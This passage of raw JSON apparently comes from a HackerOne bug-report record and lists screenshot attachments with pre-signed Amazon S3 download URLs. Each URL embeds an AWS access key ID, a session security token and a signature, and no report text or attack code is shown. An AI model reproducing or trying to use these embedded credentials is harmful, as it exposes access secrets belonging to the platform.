Qh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=f0c4b571294117150ed0a46330b32025475b7111328f582db472e7ab103de0ce"},{"id":1140116,"filename":"Screenshot_from_2020-12-31_21-08-40.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/q0r73oy0fbxu0u6z8ibbywjg9brc?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_21-08-40.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_21-08-40.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=273f4ad35df15e894d4262ee529103409e4169b94cf4ba6080280f86dc47591d"},{"id":1140120,"filename":"Screenshot_from_2020-12-31_21-20-17.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/9q2mdckjxwt880datsbc8wqvbnyr?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_21-20-17.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_21-20-17.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=0b64a3815cc7c5edf0ed5c8e4e44a63e8614aa6c90394e0207c8dfa1e238a4d8"},{"id":1140121,"filename":"Screenshot_from_2020-12-31_21-20-29.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1x8dfcshfyggnmczsyfnc03wc9j4?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_21-20-29.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_21-20-29.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=18ea57ed14bc82d416325c1050bf51c210053d19cebc7d4b994752be8fe7786d"},{"id":1140122,"filename":"Screenshot_from_2020-12-31_21-20-42.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/jf76rioy52lbupjnxpaulphkyzl4?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_21-20-42.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_21-20-42.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=e793a3e7a025c43b3b804a22b53da358632a1041440df2fba1805ce2a7cfcc56"},{"id":1140123,"filename":"Screenshot_from_2020-12-31_21-22-14.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/gmw5mdbe3r1r9732jv4f36ecocqv?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_21-22-14.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_21-22-14.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=08f4d66efe3d83a05d064ce95e461c47b26784244c424ef2c63d8b6f48767584"},{"id":1140124,"filename":"Screenshot_from_2020-12-31_21-23-14.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/dxpcahw9oj8tuu0gklzjqebeezh1?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_21-23-14.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_21-23-14.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=4316c2c54aa672fad9e34d88dc1a1708dd7732eb0bbf1ad609184b774c37853e"},{"id":1140125,"filename":"Screenshot_from_2020-12-31_21-23-59.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yk0utchgswdyhhkggxvb02r187lv?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_21-23-59.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_21-23-59.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=7e479df80a19f6bf125dcec1402484548a370a678ddb558cc5ee1d798692da7c"},{"id":1140126,"filename":"Screenshot_from_2020-12-31_21-24-25.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/q2obme37hfh8fj35kthexwq06u1a?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_21-24-25.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_21-24-25.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=c21cf15d48b6ac6f3381b53cb847f6b5599fd2ab0928e11939869089c9d59d42"},{"id":1140127,"filename":"Screenshot_from_2020-12-31_21-24-51.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/hcoxxo0a30uu7n4j1kf7vn6ijkf0?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_21-24-51.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_21-24-51.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132132Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJHMEUCIQDdpfP9zaQzdootuAesQcyxQfGfhPxZKuX1i7ijKLAzlAIgL5my807PEusr0VkqeU29XvZtEmCSLbM%2F7eKmnAELK9MqgwQI7v%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDLFQh%2Fbvd7dUg1KFQyrXA%2Fp%2FVtjehJVp7DZYy5u7sRWqZAssugTjxjLMX9n3LuBamcp6G%2Bwyw1kdH5Fc0oMbmVnKCYku75m349ci99IeZGYssnHPQFOGi3KPZcYmBTpCSWJYXklFmUzTDVSnxhcahSThqLhsURXVfnsh6wXSKZz6MsS7fD7HYiuK725Q%2F6sDk7h3pCuB5fUOqyZvOi6e%2FdSM5nyuKqUFkte%2F6i0uholiPHuOhv3puwk%2FK6F%2FiNA6QbCLyZcsFIj5wNcphNxGCbAX8GNv59qxPkBv7zU5QMZhaSRKnyFLoxSNWLKFqeO4qdN%2FgRbEF2RLvY5V1AD1BbElezpO2DYcV6sIiHwCYBPAVtJWc0Oep1T8Sx%2FIWEFxpRS%2B4EQR6%2BcQhrIR2caxSjEaPr13FV3IBlGYyL4TqPiwhW8W9gb3y9c3v7PIUkqs8IYIlAbA%2BK0arNEJfKBmrpxI03L5MtPD0eO6pxGJ9DvZkCWVCaXiTO6oSen4PpDOLghYHo%2B4Vpqvo3%2FpROjCxToAEvdKcvazzutHXo%2FsJlsjoo%2Fmx%2B1Ek92%2BufvnULE1KShcl4rj7BNA4T9Jjuo0ja%2BLxer65UO9tkrad6HgKA9hXXtyDBrlAmhTDWFKsmcmq2ihTQ7PrDCl4pCLBjqlAVM272WWPnlOeGyGQ9vB3AQrwELsHDPU0KiSwP4QYEOtuC3iFTxC%2FXRs42S51Jb7aTjsW4m6tY2xevuwO4tmkEyWJnLxLHRvktGKLmigB4rFLjusFml2FTXw5xWvfY786%2F8KQpyklyKdvZKCIlTGk1BlxxAAC17iJ1VlZV%2BzWSY7WJd1%2Fhm%2BXXw9P5X6Ch%2Fx17cYnn0uAeICgpjy1lOaC5Wkd0STsQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=adf281820151e73b11fe1c60ada994c6ddffa7afaac60ba42e00bf1d51773195"},{"id":1140131,"filename":"Screenshot_from_2020-12-31_21-33-03.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/606jny6t67b5t0tmnpdnx8z61snz?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_from_2020-12-31_21-33-03.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_from_2020-12-31_21-33-03.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQWRDWPEXO%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-A